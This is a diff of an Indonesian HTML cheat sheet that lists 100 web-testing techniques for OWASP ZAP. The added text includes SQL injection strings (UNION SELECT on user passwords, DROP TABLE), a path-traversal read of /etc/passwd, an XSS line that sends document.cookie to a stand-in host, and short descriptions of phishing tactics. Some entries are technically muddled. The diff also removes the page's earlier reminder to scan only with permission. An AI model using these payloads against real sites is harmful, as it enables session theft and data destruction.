@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OWASP ZAP - Nofrinto Flory - Syber9</title>
+    <title>OWASP ZAP Cheat Sheet - Syber9</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            background-color: #121212;
+            background-color: #1a1a1a;
             color: #00ff00;
-            font-family: 'Courier New', Courier, monospace;
+            font-family: 'Courier New', monospace;
         }
         h1, h2 {
             color: #00ff00;
@@ -18,13 +17,16 @@
         }
         .container {
             margin-top: 20px;
-            max-width: 800px;
+            max-width: 900px;
         }
         pre {
-            background-color: #1e1e1e;
-            padding: 10px;
+            background-color: #2e2e2e;
+            padding: 8px;
             border: 1px solid #00ff00;
+            border-radius: 4px;
             overflow-x: auto;
+            white-space: pre-wrap;
+            color: #d4d4d4;
         }
         .footer {
             margin-top: 20px;
@@ -39,7 +41,7 @@
             color: #00ff00 !important;
         }
         .navbar-nav .nav-link:hover {
-            background-color: #262626;
+            background-color: #333333;
         }
     </style>
 </head>
@@ -48,7 +50,6 @@
     <nav class="navbar navbar-expand-lg navbar-dark">
         <div class="container">
             <a class="navbar-brand" href="#">
-                <img style="border-radius: 100%;" src="./image/bg1.webp" alt="Nofrinto Flory" width="30" height="30">
                 OWASP ZAP
             </a>
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
@@ -63,16 +64,7 @@
                         <a class="nav-link" href="#pengantar">Pengantar</a>
                     </li>
                     <li class="nav-item">
-                        <a class="nav-link" href="#instalasi">Instalasi</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="#penggunaan">Penggunaan Dasar</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="#fitur">Fitur Utama</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="#contoh">Contoh Penggunaan</a>
+                        <a class="nav-link" href="#teknik">100 Teknik ZAP</a>
                     </li>
                     <li class="nav-item">
                         <a class="nav-link" href="#catatan">Catatan Penting</a>
@@ -83,64 +75,362 @@
     </nav>
 
     <div class="container">
-        <h1>Cheat Sheet OWASP ZAP</h1>
+        <h1>OWASP ZAP Cheat Sheet</h1>
 
-        <h2 id="pengantar">Pengenalan</h2>
+        <h2 id="pengantar">Pengantar</h2>
         <pre>
-OWASP ZAP (Zed Attack Proxy) adalah alat pemindai keamanan aplikasi web yang digunakan untuk menemukan kerentanan keamanan. Ini sangat berguna bagi pengembang dan penguji keamanan.
+OWASP ZAP adalah alat open-source yang digunakan untuk menemukan kelemahan keamanan dalam aplikasi web. 
+Berikut adalah teknik dan metode untuk mengidentifikasi kerentanan yang paling umum dengan OWASP ZAP.
         </pre>
 
-        <h2 id="instalasi">Instalasi</h2>
-        <pre>
-# Untuk menginstal OWASP ZAP, Anda dapat mengunduh dari situs resminya:
-https://www.zaproxy.org/download/
+        <h2 id="teknik">100 Teknik Penggunaan OWASP ZAP</h2>
 
-# Atau menggunakan perintah berikut untuk sistem berbasis Debian:
-sudo apt-get install zaproxy
-        </pre>
+        <!-- Teknik Penggunaan ZAP dengan contoh -->
+        <div class="example-list">
+            <h3>1-10: Teknik Pemindaian Dasar</h3>
+            <pre>
+1. Passive Scan - Memindai lalu lintas tanpa modifikasi permintaan.
+   Contoh: Menggunakan ZAP untuk menangkap trafik HTTP.
 
-        <h2 id="penggunaan">Penggunaan Dasar</h2>
-        <pre>
-# Untuk menjalankan OWASP ZAP dari command line:
-zap.sh -daemon -port 8080
-        </pre>
+2. Active Scan - Mengirimkan payload otomatis untuk menguji respon aplikasi.
+   Contoh: Menggunakan opsi active scan pada target tertentu.
 
-        <h2 id="fitur">Fitur Utama</h2>
-        <pre>
-1. **Pemindaian Otomatis**: Mampu melakukan pemindaian otomatis terhadap aplikasi web.
-2. **Pengujian Manual**: Menyediakan alat untuk pengujian manual yang mendalam.
-3. **Integrasi CI/CD**: Dapat diintegrasikan dengan pipeline CI/CD untuk pemindaian otomatis.
-4. **Dukungan API**: Menawarkan API untuk otomatisasi dan integrasi dengan alat lain.
-        </pre>
+3. Spider - Menjelajahi situs untuk menemukan semua link dan halaman.
+   Contoh: Memulai spider untuk mengindeks seluruh aplikasi.
 
-        <h2 id="contoh">Contoh Penggunaan</h2>
-        <h3>1. Memindai Situs Web</h3>
-        <pre>
-# Melakukan pemindaian terhadap situs web:
-zap.sh -quickstart -url http://example.com
-        </pre>
+4. AJAX Spider - Mencari link dinamis di aplikasi JavaScript.
+   Contoh: Mengaktifkan AJAX spider untuk aplikasi yang menggunakan JavaScript.
 
-        <h3>2. Menghasilkan Laporan dalam Format HTML</h3>
-        <pre>
-# Menghasilkan laporan hasil pemindaian:
-zap.sh -report report.html -format html
-        </pre>
+5. Forced Browse - Mencari halaman tersembunyi.
+   Contoh: Menggunakan teknik forced browse untuk menemukan halaman yang tidak terdaftar.
 
-        <h3>3. Menggunakan API untuk Pemindaian</h3>
-        <pre>
-# Menggunakan curl untuk melakukan pemindaian melalui API:
-curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://example.com"
-        </pre>
+6. Directory Browsing - Menguji akses ke direktori tidak aman.
+   Contoh: Mengakses URL tanpa indeks untuk melihat file yang ada.
+
+7. Fuzzer - Menambahkan payload acak untuk respon aplikasi.
+   Contoh: Menggunakan fuzzing untuk mengirimkan input yang tidak valid.
+
+8. Automated Attack Mode - Gabungan passive dan active scan.
+   Contoh: Mengaktifkan mode otomatis untuk pemindaian lengkap.
+
+9. Contextualize - Memfokuskan pemindaian pada area tertentu.
+   Contoh: Mengatur konteks untuk target yang relevan.
+
+10. View Site Structure - Menampilkan struktur situs yang ditemukan.
+    Contoh: Menggunakan fitur view site structure untuk menganalisis hasil.
+            </pre>
+
+            <h3>11-20: Pengujian Injeksi SQL</h3>
+            <pre>
+11. SQL Injection Basic - Uji dengan karakter seperti ' atau ".
+    Contoh: Menyisipkan ' di query login untuk menguji injeksi.
+
+12. SQL Injection Union - Coba UNION SELECT untuk query gabungan.
+    Contoh: Menggunakan ' UNION SELECT username, password FROM users--.
+
+13. SQL Injection Blind - Menggunakan waktu delay untuk SQL Injection.
+    Contoh: Menggunakan IF(condition, SLEEP(5), NULL) untuk uji buta.
+
+14. SQL Injection Error-Based - Mencari pesan error dari query.
+    Contoh: Menggunakan ' AND 1=0 UNION SELECT @@version--.
+
+15. SQL Injection Boolean-Based - Menggunakan boolean untuk perbedaan respon.
+    Contoh: Menyisipkan ' OR 1=1-- untuk mengubah hasil.
+
+16. Stacked Queries - Menjalankan query ganda dengan ;.
+    Contoh: Menggunakan '; DROP TABLE users;-- untuk mencoba menghapus tabel.
+
+17. Inline Comments - Menambahkan komentar inline untuk bypass.
+    Contoh: Menggunakan ' OR 1=1; -- untuk menonaktifkan sisa query.
+
+18. Stored Procedure Injection - Uji prosedur tersimpan.
+    Contoh: Menggunakan EXECUTE untuk memanggil prosedur berbahaya.
+
+19. Time-Based Delay - Uji delay SQL.
+    Contoh: Menggunakan IF(condition, SLEEP(10), NULL) untuk eksploitasi.
+
+20. SQL Wildcards - Gunakan wildcard % atau _.
+    Contoh: Menyisipkan '%' untuk mencocokkan banyak karakter.
+            </pre>
+
+            <h3>21-30: Pemindaian XSS</h3>
+            <pre>
+21. XSS Reflected - Input berbahaya muncul langsung di respon.
+    Contoh: Menggunakan <script>alert('XSS')</script> di parameter query.
+
+22. XSS Stored - Data berbahaya tersimpan dan muncul pada aplikasi.
+    Contoh: Menginputkan <script>alert('XSS')</script> di form komentar.
+
+23. XSS DOM-Based - Input berbahaya disuntikkan ke DOM.
+    Contoh: Memodifikasi URL untuk menyuntikkan skrip berbahaya.
+
+24. XSS Cookie Hijack - Gunakan XSS untuk mencuri cookie.
+    Contoh: <script>document.location='http://malicious.com?cookie='+document.cookie;</script>.
+
+25. XSS Keylogger - Injeksi JavaScript untuk mencatat input.
+    Contoh: Menyisipkan skrip untuk merekam input pengguna.
+
+26. XSS Redirect - Mengalihkan pengguna ke situs berbahaya.
+    Contoh: <script>window.location='http://malicious.com';</script>.
+
+27. XSS HTML Injection - Manipulasi HTML untuk menciptakan XSS.
+    Contoh: Menyisipkan elemen HTML berbahaya dalam input.
+
+28. XSS Script Tag - Gunakan tag <script> untuk serangan.
+    Contoh: Menyisipkan <script>console.log('XSS');</script>.
+
+29. XSS Image Tag - Gunakan tag <img src=x onerror=alert(1)>.
+    Contoh: <img src="invalid.jpg" onerror="alert('XSS');">.
+
+30. XSS Style Injection - Gunakan CSS untuk eksploitasi visual.
+    Contoh: <style>* {display:none;}</style> untuk menyembunyikan elemen.
+            </pre>
+
+            <h3>31-40: Teknik Pemalsuan Identitas (CSRF)</h3>
+            <pre>
+31. CSRF Login Form - Gunakan CSRF untuk mencuri sesi login.
+    Contoh: Membuat form otomatis untuk login pengguna tanpa izin.
+
+32. CSRF Action Hijack - Injeksi aksi berbahaya tanpa izin.
+    Contoh: Menggunakan form dengan aksi berbahaya ke URL target.
+
+33. CSRF Token Tampering - Manipulasi token CSRF.
+    Contoh: Mengganti token CSRF dalam form untuk eksploitasi.
+
+34. CSRF Form Submission - Kirim form otomatis dengan CSRF.
+    Contoh: <form action="http://id.com/action" method="POST">
+                <input type="hidden" name="data" value="malicious">
+                <input type="submit">
+              </form>.
+
+35. CSRF Cookie Stealing - Mencuri cookie melalui CSRF.
+    Contoh: Kirim permintaan untuk mengakses data cookie.
+
+36. CSRF Fetch API - Gunakan Fetch API untuk serangan.
+    Contoh: Menggunakan Fetch untuk mengakses URL tanpa izin.
+
+37. CSRF Redirect - Redirect pengguna untuk menyerang.
+    Contoh: Redirect ke URL berbahaya menggunakan CSRF.
+
+38. CSRF Email Trigger - Mengirim email tanpa izin.
+    Contoh: Form yang mengirim email ke pengguna tanpa izin.
+
+39. CSRF API Access - Akses API tanpa izin.
+    Contoh: Mengirimkan permintaan API tanpa autentikasi.
+
+40. CSRF Domain Spoofing - Menggunakan domain palsu untuk serangan.
+    Contoh: Mengarahkan pengguna ke domain yang mirip untuk mengelabui.
+            </pre>
+
+            <h3>41-50: Pengujian Autentikasi</h3>
+            <pre>
+41. Credential Stuffing - Menggunakan kredensial yang dibocorkan.
+    Contoh: Menggunakan daftar username dan password yang bocor untuk login.
+
+42. Password Brute Force - Mencoba semua kombinasi password.
+    Contoh: Menggunakan ZAP untuk menyerang login dengan brute force.
+
+43. Session Fixation - Menggunakan sesi yang telah ditentukan sebelumnya.
+    Contoh: Mengatur sesi pengguna sebelum login.
+
+44. Multi-Factor Bypass - Mencoba melewati MFA.
+    Contoh: Menggunakan teknik rekayasa sosial untuk mendapatkan kode MFA.
+
+45. JWT Manipulation - Mengubah payload JWT untuk akses.
+    Contoh: Mengubah nilai dalam JWT untuk mendapatkan akses tidak sah.
+
+46. Token Replay - Mengulangi token yang sudah dipakai.
+    Contoh: Menggunakan token akses yang telah dicuri.
+
+47. Access Control Testing - Menguji kontrol akses pada endpoint.
+    Contoh: Mencoba mengakses endpoint yang seharusnya dilindungi.
+
+48. API Key Exposure - Mengungkap kunci API dalam respon.
+    Contoh: Mencari kunci API yang tidak disembunyikan dalam respon.
+
+49. Privilege Escalation - Mencoba naik hak akses.
+    Contoh: Menggunakan teknik eksploitasi untuk mendapatkan hak admin.
+
+50. Open Redirect - Mencoba redirect ke situs lain.
+    Contoh: Menggunakan parameter redirect untuk mengalihkan pengguna.
+            </pre>
+
+            <h3>51-60: Teknik Manajemen Sesi</h3>
+            <pre>
+51. Session Timeout - Menguji kebijakan waktu habis sesi.
+    Contoh: Menunggu sesi habis dan mencoba mengakses kembali.
+
+52. Session Invalidation - Mencoba memvalidasi sesi setelah logout.
+    Contoh: Mengakses sesi setelah logout untuk mengecek keamanan.
+
+53. URL Session ID - Mencari ID sesi di URL.
+    Contoh: Mencari ID sesi yang terbuka di URL untuk eksploitasi.
+
+54. Session Fixation - Mencoba memaksa sesi pengguna.
+    Contoh: Menetapkan sesi sebelum login dan mengujinya.
+
+55. Persistent Session - Mencari sesi yang bertahan.
+    Contoh: Mencoba untuk menyimpan sesi pengguna.
+
+56. Same-Site Cookies - Menguji pengaturan cookie Same-Site.
+    Contoh: Memastikan cookie tidak dapat diakses dari domain lain.
+
+57. Secure Cookie - Memastikan cookie hanya dapat diakses melalui HTTPS.
+    Contoh: Menguji cookie tanpa flag Secure.
+
+58. Cookie HttpOnly - Menguji akses cookie dari JavaScript.
+    Contoh: Menggunakan JavaScript untuk mencoba mengakses cookie HttpOnly.
+
+59. CSRF Protection - Menguji adanya perlindungan CSRF.
+    Contoh: Mengirim permintaan tanpa token CSRF untuk melihat reaksi.
+
+60. Cookie Manipulation - Mengubah nilai cookie untuk eksploitasi.
+    Contoh: Mengubah nilai cookie untuk mendapatkan akses tidak sah.
+            </pre>
+
+            <h3>61-70: Pengujian Keamanan Server</h3>
+            <pre>
+61. Server Information Disclosure - Mencari informasi server yang tidak perlu.
+    Contoh: Mengakses /server-status untuk mendapatkan informasi server.
+
+62. Directory Traversal - Mencoba mengakses file sistem.
+    Contoh: Menggunakan ../ untuk mengakses file di luar direktori.
+
+63. Unrestricted File Upload - Menguji upload file tanpa validasi.
+    Contoh: Mengupload file .php untuk eksekusi.
+
+64. File Inclusion - Menguji untuk memasukkan file berbahaya.
+    Contoh: Menggunakan /path/to/file.php?file=../../../../etc/passwd.
+
+65. Misconfigured Headers - Mencari header keamanan yang hilang.
+    Contoh: Memeriksa keberadaan X-Content-Type-Options.
+
+66. SSL/TLS Configuration - Menguji konfigurasi SSL.
+    Contoh: Menggunakan alat untuk memeriksa kekuatan SSL.
+
+67. CORS Misconfiguration - Mencari konfigurasi CORS yang buruk.
+    Contoh: Mengizinkan semua origin dalam konfigurasi CORS.
+
+68. Default Credentials - Mencari username dan password default.
+    Contoh: Mencoba username 'admin' dan password 'admin'.
+
+69. Outdated Software - Mencari versi perangkat lunak yang ketinggalan zaman.
+    Contoh: Menggunakan alat untuk mendeteksi perangkat lunak lama.
+
+70. Sensitive Data Exposure - Mencari data sensitif dalam respon.
+    Contoh: Memeriksa apakah data sensitif dikirim dalam plaintext.
+            </pre>
+
+            <h3>71-80: Pengujian API</h3>
+            <pre>
+71. REST API Testing - Mencoba endpoint RESTful untuk eksploitasi.
+    Contoh: Menggunakan payload untuk menguji endpoint API.
+
+72. GraphQL Injection - Mencari kerentanan di API GraphQL.
+    Contoh: Menyisipkan payload berbahaya ke query GraphQL.
+
+73. API Rate Limiting - Menguji pembatasan akses API.
+    Contoh: Mengirim banyak permintaan untuk melihat pembatasan.
+
+74. Unauthenticated API Access - Mencoba akses API tanpa autentikasi.
+    Contoh: Mengakses endpoint API tanpa token.
+
+75. Insecure API Endpoints - Mencari endpoint yang tidak aman.
+    Contoh: Mengidentifikasi endpoint publik yang seharusnya privat.
+
+76. API Key Exposure - Mencari kunci API yang tidak terlindungi.
+    Contoh: Mencari kunci dalam respons JSON.
+
+77. API Token Replay - Mencoba untuk menggunakan token yang sudah tidak berlaku.
+    Contoh: Menggunakan token yang telah dicuri untuk mengakses API.
+
+78. GraphQL Depth Attack - Menguji kedalaman query untuk eksploitasi.
+    Contoh: Menyusun query dengan kedalaman tinggi untuk menyebabkan masalah.
+
+79. API Data Validation - Mencari data yang tidak divalidasi.
+    Contoh: Mengirimkan data berbahaya ke API untuk melihat respon.
+
+80. OpenAPI Documentation Testing - Mencari informasi dari dokumentasi API.
+    Contoh: Menggunakan dokumentasi untuk eksploitasi endpoint.
+            </pre>
+
+            <h3>81-90: Teknik Rekayasa Sosial</h3>
+            <pre>
+81. Phishing - Menggunakan URL palsu untuk mencuri kredensial.
+    Contoh: Mengirim email yang tampak asli tetapi mengarahkan ke situs berbahaya.
+
+82. Pretexting - Menggunakan identitas palsu untuk mendapatkan informasi.
+    Contoh: Menghubungi dukungan pelanggan dengan identitas palsu.
+
+83. Baiting - Menawarkan sesuatu untuk mendapatkan akses.
+    Contoh: Memberikan flashdisk yang terinfeksi kepada pengguna.
+
+84. Quizzing - Menanya pengguna untuk informasi sensitif.
+    Contoh: Mengirimkan survei yang meminta informasi pribadi.
+
+85. Tailgating - Mengikuti seseorang ke area aman.
+    Contoh: Mengikuti pegawai ke gedung dengan akses terbatas.
+
+86. Vishing - Menggunakan telepon untuk menipu.
+    Contoh: Menghubungi korban dengan berpura-pura sebagai bank.
+
+87. Smishing - Mengirim SMS untuk mencuri informasi.
+    Contoh: Mengirim SMS yang meminta klik tautan berbahaya.
+
+88. Spear Phishing - Targeted phishing untuk individu.
+    Contoh: Mengirim email yang tampak berasal dari atasan.
+
+89. Impersonation - Meniru identitas orang lain.
+    Contoh: Menggunakan akun palsu untuk mendapatkan informasi.
+
+90. Social Media Exploitation - Menggunakan media sosial untuk eksploitasi.
+    Contoh: Mencari informasi di profil media sosial untuk serangan.
+            </pre>
+
+            <h3>91-100: Teknik Manajemen Kerentanan</h3>
+            <pre>
+91. Vulnerability Scanning - Menggunakan alat untuk mencari kerentanan.
+    Contoh: Menggunakan ZAP untuk memindai aplikasi web secara otomatis.
+
+92. Patch Management - Mengelola pembaruan perangkat lunak.
+    Contoh: Menguji aplikasi untuk memastikan semua patch diterapkan.
+
+93. Security Training - Melatih pengguna untuk mengenali serangan.
+    Contoh: Mengadakan workshop keamanan bagi karyawan.
+
+94. Incident Response - Mengelola dan merespon insiden keamanan.
+    Contoh: Menerapkan rencana tanggap darurat untuk insiden.
+
+95. Security Policy Review - Meninjau kebijakan keamanan secara berkala.
+    Contoh: Memastikan kebijakan keamanan diperbarui sesuai kebutuhan.
+
+96. Risk Assessment - Melakukan penilaian risiko terhadap sistem.
+    Contoh: Mengidentifikasi dan menilai risiko terhadap data sensitif.
+
+97. Threat Modeling - Mengidentifikasi ancaman dan kerentanan.
+    Contoh: Membuat model ancaman untuk aplikasi baru.
+
+98. Penetration Testing - Menguji sistem dengan teknik eksploitasi.
+    Contoh: Menggunakan ZAP untuk pengujian penetrasi pada aplikasi.
+
+99. Security Auditing - Mengaudit keamanan sistem secara rutin.
+    Contoh: Melakukan audit berkala untuk memastikan kepatuhan.
+
+100. Continuous Monitoring - Memantau keamanan secara terus-menerus.
+    Contoh: Menggunakan alat pemantauan untuk deteksi awal serangan.
+            </pre>
+        </div>
 
         <h2 id="catatan">Catatan Penting</h2>
         <pre>
-- Pastikan Anda memiliki izin untuk melakukan pemindaian terhadap aplikasi yang Anda targetkan.
-- Gunakan ZAP dengan etika dan sesuai hukum yang berlaku.
+- Selalu periksa dan pastikan aplikasi Anda aman terhadap kerentanan yang umum.
+- Gunakan alat keamanan seperti OWASP ZAP secara rutin untuk mengidentifikasi dan memperbaiki kerentanan.
+- Pelatihan dan kesadaran keamanan sangat penting untuk melindungi sistem Anda.
         </pre>
-    </div>
 
-    <div class="footer">
-        <p>&copy; 2024 Nofrinto Flory - Cheat Sheet OWASP ZAP</p>
+        <div class="footer">
+            <p>&copy; 2024 Syber9. Semua hak dilindungi.</p>
+        </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
